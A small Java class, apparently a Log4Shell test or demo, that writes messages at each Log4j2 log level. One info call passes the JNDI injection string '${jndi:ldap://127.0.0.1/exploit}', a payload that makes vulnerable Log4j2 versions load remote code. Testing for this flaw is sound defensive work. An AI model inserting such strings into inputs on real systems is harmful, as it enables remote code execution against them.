package io.github.junlapong;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class ClassUseLog4j2 {
	private static Logger logger = LogManager.getLogger(ClassUseLog4j2.class);

	public static void printLog() {
		logger.trace("trace message");
		logger.debug("debug message");
		logger.info("Hello log2shell: {}", "${jndi:ldap://127.0.0.1/exploit}");
		logger.warn("warn message");
		logger.error("error message");
	}
}
